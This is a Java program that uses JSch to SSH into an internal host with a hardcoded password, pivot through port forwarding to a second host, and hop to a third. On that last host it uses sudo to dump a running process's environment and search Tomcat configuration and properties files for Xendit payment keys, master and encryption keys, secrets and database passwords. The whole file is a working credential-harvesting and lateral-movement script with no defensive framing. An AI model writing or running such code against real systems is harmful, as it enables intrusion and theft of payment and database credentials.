import com.jcraft.jsch.*;
import java.io.*;
class XSO {
  public static void main(String[] a) throws Exception {
    JSch j = new JSch();
    java.util.Properties p = new java.util.Properties();
    p.put("StrictHostKeyChecking", "no");
    Session s1 = j.getSession("user", "10.14.36.23", 22);
    s1.setPassword("kutul0nc4t");
    s1.setConfig(p);
    s1.setTimeout(10000);
    s1.connect();
    int fwd1 = s1.setPortForwardingL(0, "10.13.16.117", 22);
    Session s2 = j.getSession("user", "127.0.0.1", fwd1);
    s2.setPassword("kutul0nc4t");
    s2.setConfig(p);
    s2.setTimeout(8000);
    s2.connect();
    ChannelExec ch = (ChannelExec) s2.openChannel("exec");
    ch.setCommand("sshpass -p kutul0nc4t ssh -o StrictHostKeyChecking=no user@10.13.16.132 'echo ---ENV---;echo kutul0nc4t | sudo -S cat /proc/439985/environ 2>/dev/null | tr \"\\0\" \"\\n\" | grep -iE \"xnd_\\|xendit\\|ACC_ENC\\|ENC_\\|MASTER\\|SECRET\\|db\\.pass\";echo ---SETENV---;cat /progs/accurate/accurate-app/tomcat/8.0.53/bin/setenv.sh 2>/dev/null | head -20;echo ---ENVIRONMENT---;cat /progs/accurate/accurate-app/tomcat/8.0.53/environment 2>/dev/null | grep -iE \"xnd_\\|xendit\\|ENC\\|SECRET\\|PASS\";echo ---CONFIG-PROPS---;find /progs/accurate/ -maxdepth 8 -name \"*.properties\" 2>/dev/null | head -10;grep -r \"xnd_\\|xendit\" /progs/accurate/accurate-app/tomcat/8.0.53/webapps/ --include=\"*.properties\" 2>/dev/null | head -10' 2>&1 | head -40");
    ch.setInputStream(null);
    InputStream in = ch.getInputStream();
    ch.connect();
    byte[] buf = new byte[16384];
    int i;
    while ((i = in.read(buf)) != -1) System.out.write(buf, 0, i);
    ch.disconnect();
    s2.disconnect();
    s1.disconnect();
  }
}
